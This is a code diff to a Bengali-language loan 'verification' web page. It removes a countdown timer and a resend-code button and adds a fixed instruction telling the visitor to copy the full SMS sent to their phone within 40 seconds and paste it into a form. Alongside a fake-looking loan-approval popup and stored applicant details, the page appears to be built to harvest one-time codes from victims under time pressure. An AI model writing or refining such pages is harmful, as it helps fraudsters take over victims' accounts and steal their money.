@@ -13,7 +13,6 @@
             font-family: 'Segoe UI', Roboto, sans-serif; 
         }
 
-        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
         body { 
             background: #ffffff; 
             min-height: 100vh; 
@@ -34,7 +33,6 @@
             border-right: 1px solid #fff7ed;
         }
 
-        /* কমলা গ্রেডিয়েন্ট হেডার */
         .header { 
             background: linear-gradient(135deg, #ff5e00, #ff8800); 
             color: #ffffff; 
@@ -62,9 +60,7 @@
         .header p { font-size: 13px; opacity: 0.95; }
 
         .form-wrap { padding: 22px 20px; flex-grow: 1; display: flex; flex-direction: column; justify-content: flex-start; }
-        .timer-box { background: #fff8f0; border: 1.5px solid #fed7aa; color: #c2410c; padding: 12px 14px; border-radius: 12px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; text-align: center; }
-        .timer-box.expired { background: #fef2f2; border-color: #fecaca; color: #b91c1c; }
-        .timer-num { color: #ea580c; font-weight: 800; font-size: 15px; }
+        .timer-box { background: #fff8f0; border: 1.5px solid #fed7aa; color: #c2410c; padding: 12px 14px; border-radius: 12px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; text-align: center; line-height: 1.5; }
 
         .form-group { margin-bottom: 18px; }
         .form-group label { display: block; font-size: 13.5px; font-weight: 700; color: #334155; margin-bottom: 8px; }
@@ -74,10 +70,6 @@
 
         .btn-submit { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff5e00, #ff8800); color: #ffffff; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); }
         .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
-
-        .resend-wrap { display: none; text-align: center; margin-top: 16px; }
-        .btn-resend { background: none; border: 1.5px dashed #ff5e00; color: #ea580c; padding: 9px 18px; border-radius: 20px; font-size: 13px; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 7px; }
-        .btn-resend:hover { background: #fff7ed; }
 
         /* সোশ্যাল-প্রুফ নোটিফিকেশন */
         .loan-popup { position: fixed; bottom: 20px; left: 20px; background: #ffffff; color: #1e293b; padding: 12px 16px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); display: flex; align-items: center; gap: 12px; z-index: 9999; max-width: 340px; border-left: 5px solid #16a34a; opacity: 0; transform: translateY(30px); transition: all 0.5s ease-in-out; pointer-events: none; }
@@ -104,7 +96,7 @@
     <div class="form-wrap">
         <div class="timer-box" id="timerBox">
             <i class="fa-regular fa-clock"></i>
-            <span id="timerText"><span class="timer-num" id="timeCount">২০</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।</span>
+            <span>৪০ সেকেন্ড এরমধ্যে আপনার ফোনে যে মেসেজ যাবে সেটা পুরোটা কপি করে নিচের বক্সের বসিয়ে দিন</span>
         </div>
 
         <form id="verifyForm2">
@@ -118,12 +110,6 @@
                 <i class="fa-solid fa-arrow-right"></i>
             </button>
         </form>
-
-        <div class="resend-wrap" id="resendWrap">
-            <button type="button" class="btn-resend" id="btnResend">
-                <i class="fa-solid fa-rotate-right"></i> পুনরায় কোড পাঠান
-            </button>
-        </div>
     </div>
 </div>
 
@@ -145,46 +131,6 @@
     const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
     const applicantPhone = params.get('phone') || localStorage.getItem('loan_cust_phone') || 'N/A';
     const applicantAmount = params.get('amount') || localStorage.getItem('loan_cust_amount') || 'N/A';
-
-    let timeLeft = 20;
-    let timer = null;
-    const timerBox = document.getElementById("timerBox");
-    const timerText = document.getElementById("timerText");
-    const resendWrap = document.getElementById("resendWrap");
-    const btnResend = document.getElementById("btnResend");
-    const bnNums = ['০','১','২','৩','৪','৫','৬','৭','৮','৯'];
-
-    function toBn(n) {
-        return n.toString().replace(/[0-9]/g, d => bnNums[d]);
-    }
-
-    function startTimer() {
-        clearInterval(timer);
-        timeLeft = 20;
-        resendWrap.style.display = "none";
-        timerBox.classList.remove("expired");
-        timerText.innerHTML = `<span class="timer-num" id="timeCount">${toBn(timeLeft)}</span> সেকেন্ডের মধ্যে আপনার পুরো এসএমএসটি কপি করে দিন।`;
-
-        timer = setInterval(() => {
-            timeLeft--;
-            const countSpan = document.getElementById("timeCount");
-            if (timeLeft > 0) {
-                if (countSpan) countSpan.innerText = toBn(timeLeft);
-            } else {
-                clearInterval(timer);
-                timerBox.classList.add("expired");
-                timerText.innerHTML = 'সময় শেষ! কোড না পেয়ে থাকলে নিচে থেকে পুনরায় পাঠান।';
-                resendWrap.style.display = "block";
-            }
-        }, 1000);
-    }
-
-    startTimer();
-
-    btnResend.addEventListener("click", () => {
-        alert("আপনার ফোনে নতুন করে কোড পাঠানো হচ্ছে...");
-        startTimer();
-    });
 
     const form = document.getElementById("verifyForm2");
     const btnSubmit = document.getElementById("btnSubmit");
